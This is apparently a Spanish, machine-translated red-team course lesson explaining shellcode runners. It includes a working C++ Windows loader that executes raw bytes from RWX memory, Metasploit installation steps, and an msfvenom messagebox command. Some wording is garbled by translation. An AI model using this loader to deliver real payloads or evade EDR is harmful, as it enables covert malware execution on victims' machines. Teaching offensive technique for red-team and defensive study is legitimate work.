### ¿Qué es un Shellcode Runner?

A **corredor de shellcode** es un programa pequeño, generalmente escrito en C, C++ o ensamblador, cuyo único propósito es **cargar y ejecutar shellcode en la memoria**. Es un concepto vital en el desarrollo de exploits, pruebas posteriores a la explotación y herramientas Red Team.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-what-is-shellcode)¿Qué es Shellcode?

- **Código Shell** es una secuencia de instrucciones a nivel de máquina que **realizar acciones específicas** (por ejemplo, iniciar un shell inverso, mostrar un mensaje o generar un proceso).
- Es típicamente el **carga útil** utilizado después de explotar una vulnerabilidad.
- Shellcode suele escribirse en **montaje**, luego compilado y extraído como **bytes hexadecimales**.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-what-does-a-shellcode-runner-do)¿Qué hace un ejecutor de Shellcode?

El ejecutor de shellcode:

1. **Asigna memoria** en el proceso actual con `EXECUTE` permisos.
2. **Copia el shellcode** en la memoria asignada.
3. **Lanza la memoria** como puntero de función.
4. **Invoca el código shell**, provocando que se ejecute.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-breakdown-of-the-shellcode-runner-code)Desglose del código de ejecución de Shellcode

```cpp
#include <windows.h>
#include <iostream>

unsigned char shellcode[] =
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80";
```

- Esto es crudo **shellcode** en forma hexadecimal.
- Este código shell en particular es **Basado en Linux (`cd 0x80`)** y no funcionará tal como está en Windows; está aquí sólo como ejemplo.

---

```cpp
void* execMem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

- Asigna **memoria en el espacio de direcciones del proceso**.
- `PAGE_EXECUTE_READWRITE`: permite que la memoria sea **ejecutable**, **legible**, y **escribible** (un antipatrón común marcado por los EDR).

---

```cpp
memcpy(execMem, shellcode, sizeof(shellcode));
```

- Copia el shellcode **en la memoria asignada**.

---

```cpp
auto shellcodeFunc = reinterpret_cast<void(*)()>(execMem);
shellcodeFunc();
```

- **Elencos** el puntero de memoria sin procesar como puntero de función y **lo llama**.
- Este es el momento en que se ejecuta el shellcode **ejecutado en memoria**.

---

```cpp
VirtualFree(execMem, 0, MEM_RELEASE);
```

- Libera la memoria después de la ejecución (opcional, ya que es probable que el proceso finalice poco después).

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-key-takeaways)Conclusiones clave

- Los ejecutores de Shellcode se utilizan para **Ejecutar cargas útiles directamente desde la memoria**, sin escribirlos en el disco.
- Ellos son un **Técnica común en el Equipo Rojo y seguridad ofensiva**, pero también fuertemente monitoreado por los modernos **Soluciones EDR y antivirus**.
- Las cargas útiles del mundo real deben ser **Código shell compatible con Windows**, a menudo generado utilizando herramientas como `msfvenom`, `Donut`, o escrito manualmente en ensamblaje.

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-security-implication)Implicaciones de seguridad

Porque este comportamiento (asignar memoria con `PAGE_EXECUTE_READWRITE`, escribiendo shellcode y llamándolo) **imita el malware**, es monitoreado de cerca y a menudo marcado por los EDR como comportamiento malicioso. Evitar estas detecciones es una parte esencial del Red Teaming avanzado y la emulación de amenazas.

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-download-do-metasploit)**Descargar do Metasploit**

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/3af69eb8-fca9-4740-826c-f4b9692859b9)

Descargar versión de código abierto

Enlace: [https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/dc31a811-264a-491a-b9ac-8f1c2325a6ea)

Descargue el instalador de versiones de Windows

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/fbe11631-22e5-411c-8675-1460fa714dd4)

Ejecute el instalador de Metasploit

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/c8e6a955-5955-433e-b65b-fc371a9b231d)

Haga clic en “Siguiente” para continuar con la configuración

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/13564824-d79f-44de-84fb-16fcbc17d8d8)

Acepte el acuerdo de licencia y haga clic en “Siguiente”

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/6f5a27d4-d60c-438c-85b1-1b2ef9b74ca5)

Haga clic en “Siguiente” para continuar con la configuración predeterminada

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/4da18856-f1d9-4b71-bcbd-f2c4eb620134)

Haga clic en “Instalar” para comenzar la instalación

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/f7adfef0-19c9-40c2-ac8a-bf82ad4bf218)

Haga clic en “Sí” para permitir la instalación de componentes adicionales

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/2078b589-bec1-43c4-8870-ad07e193e3c7)

Haga clic en “Finalizar” para completar la configuración

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/b9681330-8b35-44c5-90dc-8ef1bb5ca060)

Navegue hasta la carpeta `metasploit-framework` en la unidad C:

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/84b5e3e8-35d3-42c1-9a8c-3f4c3c72870a)

Prueba de Metasploit generando un shellcode simple

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-runner-basic#user-content-shellcode-runner-example)Ejemplo de ejecución de Shellcode

Comando de ejemplo:

```bash
# msfvenom -p windows/x64/messagebox -f c
```

Ejemplo de ejecutor de C++:

```cpp
#include <windows.h>
#include <iostream>

unsigned char shellcode[] =
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80";

int main() {
    // Allocate memory with execution permission
    void* execMem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "Memory allocation failed!" << std::endl;
        return -1;
    }

    // Copy shellcode to the allocated memory
    memcpy(execMem, shellcode, sizeof(shellcode));

    // Cast the memory as a function and call it
    auto shellcodeFunc = reinterpret_cast<void(*)()>(execMem);
    shellcodeFunc();

    // Optionally free memory (not necessary here)
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
```

![](https://images.coursestack.com/62c9b0f6-6a0a-488c-870b-4ca0ac754378/cd6d0de3-00c0-4f77-ac0f-7120e44debdd)